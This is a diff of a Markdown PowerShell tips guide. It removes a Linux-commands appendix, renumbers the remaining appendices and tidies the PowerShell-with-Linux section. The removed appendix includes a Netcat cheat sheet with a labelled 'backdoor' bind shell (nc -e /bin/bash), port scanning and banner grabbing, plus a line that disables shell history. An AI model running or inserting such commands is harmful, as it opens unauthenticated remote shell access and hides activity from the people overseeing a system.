@@ -12,10 +12,9 @@ This is not a complete guide how to learn Powershell. This is just a set of some
 * [Powershell with Linux](#powershell-with-linux)
 * [Task automation](#task-automation)
 * [Pester and modules](#pester-and-modules)
-* [Appendix A - Linux commands](#appendix-a---linux-commands)
-* [Appendix B - Serial port](#appendix-b---serial-port)
-* [Appendix C - Colors in .Net](#appendix-c---colors-in-.net)
-* [Appendix D - Wmic and netsh](#appendix-d---wmic-and-netsh)
+* [Appendix A - Serial port](#appendix-b---serial-port)
+* [Appendix B - Colors in .Net](#appendix-c---colors-in-.net)
+* [Appendix C - Wmic and netsh](#appendix-d---wmic-and-netsh)
 * [Useful links](#useful-links)
 
 ## Everyday struggles
@@ -966,14 +965,13 @@ ls \\tsclient\D\projects
 ```
 
 ## Powershell with Linux
-Although it is not effortless, it is possilbe to make Powershell working with Linux. And it is a quite nice combo. Here we are going to focus on how to do something with Linux machine from Powershell remotely rather than how to install Powershell on Linxu - but this is also possible nowadays! In case if you are not very familiar with Linux commands, go to Appendix 1. Now, you need to open SSH on Linux, here is how to do it:
+Although it is not effortless, it is possilbe to make Powershell working with Linux. And it is a quite nice combo. Here we are going to focus on how to do something with Linux machine from Powershell remotely rather than how to install Powershell on Linxu - but this is also possible nowadays, especially since Powershell 6 was introduced. Now, you need to open SSH on Linux, here is how to do it:
 ```bash
 service ssh open #open/status/stop
 ```
 And on the Powershell side you may need the passoword to remote Linux machine. It is nice to get the password using **Get-Credential** cmdlet, it is a bit safier than typing it directly in the code:
 ```powershell
-$haslo = (Get-Credential -UserName user_name -Message "Password please!") `
-		.GetNetworkCredential().Password
+$haslo = (Get-Credential -UserName user_name -Message "Password please!").GetNetworkCredential().Password
 ```
 
 ### Remote command exectution with plink
@@ -1383,116 +1381,7 @@ Set-Content $testPath -value "my test text."
 function global:Write-Host() {}
 ```
 
-## Appendix A - Linux commands
-Here you will find just some very basic review of Linux commands. If you are interested in more detailed stuff, go [here](https://www.computerhope.com/unix.htm). And if you have no Linux at all, this is a [nice distribution](https://tails.boum.org/).
-
-### Files
-```bash
-touch file1 			#creates new file
-echo "hello world" > file1	#puts some conent to file1
-mkdir myDirectory		#creates directory
-cp file1 myDirectory		#copies file1 to myDirectory
-mv myDirectory/file1 myDirectory/file2
-chmod 655 file1				
-chmod u+x,o-r file2
-```
-
-###  Searching files
-Simple find, searching in the current directory.
-```bash
-find -name myfile.txt
-```
-This returns the path from $PATH variable to the given binary
-```bash
-which ls 
-```
-Searching file with the given name
-```bash
-whereis aircrack-ng
-```
-Searching all the paths that contain the given name, basing on the the files database managed by the system - it doesn't work for the newest files because they may not me be in the database yet.
-```bash
-locate aircrack-ng
-```
-
-### Processes
-```bash
-ps -aux		#show all processes
-top		#show most processor-consuming tasks
-kill 102 	#kill process with the given pid
-nice -n -5 top	#spawn the process with adjusted nicenness (priority)
-renice 102 -15	#increase the process priority
-ps & 		#run the task in background
-```
-
-### System variables
-```bash
-set 
-echo $HISTSIZE
-HISTSIZE=0 #no space!!!
-export HISTSIZE
-PATH=$PATH:/new/soft
-```
-
-### Users
-```bash
-useradd -d /home/topsecretdata abik
-useradd -G admins,webdev abik
-useradd -M abik #user without home directory
-passwd abik
-id abik #user info
-cat /etc/passwd | grep abik #user info
-deluser --remove-home abik
-su - abik #login as abik
-```
-
-### Text files
-```bash
-nl file1				#displays file with line numeration
-head -30 file1				#displays first 30 lines
-cat file1 | grep abik			#search for a string 'abik' in file1
-sed s/abik/ABIK/ file1 > file1		#replaces first occurance of 'abik' to 'ABIK'
-sed s/abik/ABIK/g file1 > file1		#g - global, all occurances
-sed s/abik/ABIK/3 file1 > file1		#third occurance
-```
-
-### Network
-```bash
-ifconfig ethX NODE_IP_ADDRESS netmask NETWORK_MASK up
-
-### ruter
-sysctl -w net.ipv4.ip_forward=1
-route add -net NETWORK_IP_ADDRESS netmask NETWORK_MASK dev ethX #add/del
-
-### host
-route add default gw RUTER_IP_ADDRESS ethX
-```
-
-### Netcat
-```bash
-### recieve file 
-nc -l -p 5500 > outfile
-
-### sending
-nc -w3 DESTINATION_IP 5500 < infile
-
-### scanning 
-nc -v -n -z -w1 ADDRESS_IP STARTPORT-ENDPORT
-
-### banner grabbing: 
-echo "" | nc -v -n -z -w1 ADDRESS_IP STARTPORT-ENDPORT
-
-### backdoor: 
-nc -l -p 5500 -e /bin/bash
-
-### mini serwer: 
-while true; do 
-	cat index.html | nc -l -p 5500 | head --bytes 2000 >>req.log
-	date >>req.log
-	done
-```
-
-## Appendix B - Serial port
+## Appendix A - Serial port
 It may not be the most common solution to handle serial port through Powershell, but that doesn't mean it cannot be done. And here are some tips how to make it. First, let's look get currently available port names: 
 ```powershell
 [System.IO.Ports.SerialPort]::GetPortNames() 
@@ -1536,7 +1425,7 @@ serialPort.DataReceived += methodDelegate;	//methodDelegate - SerialDataReceived
 ```
 For more detailed information go [here](https://msdn.microsoft.com/pl-pl/library/system.io.ports.serialport(v=vs.110).aspx) or [here](http://www.sparxeng.com/blog/software/must-use-net-system-io-ports-serialport)
 
-## Appendix C - Colors in .Net
+## Appendix B - Colors in .Net
 In general colors in .Net are represented by **Color** class form **System.Drawing** namespace. They consist of four 8 bit numbers representing transparency (alpha), red, green and blue and the whole color can be represented simply by a 32 bit integer value. Once I encountered a system that was saving colors of some objects as such 32 bit integer value, for example *-5658199*. This is some kind of grey and I was asked to change it to lighter grey. I didn't know what is this number and how to understand it, how to convert it to hex notation or ARGB. Powershell helped me a lot to understand it and to achieve my goal. I tried to put this mysterious number as an argument of **FromArgb** static method of **Color** class and it return an object of type **Color** with all the color details.
 ```powershell
 Add-Type -AssemblyName System.Drawing
@@ -1550,7 +1439,7 @@ $color.ToArgb()
 ```
 That's all!
 
-## Appendix D - Wmic and netsh
+## Appendix C - Wmic and netsh
 There are two extremely powerfull commands in Windows. Actually there are much more, but here I would like to say a word or two about **wmic** and **netsh**. The first one is WMI (Windows Management Instrumentation) command line tool that allows you to get almost any kind of information about software and hardware and manage the system. The second command is intended to configure and manage networks through command line. Both tools are designed for someting different but you can sometimes achieve the same goal using them. It is also good to know that they both can work in interactive (shell) mode but for scripting it is much better to use them simply as commands putting all the required parameters.
 
 ### Netsh
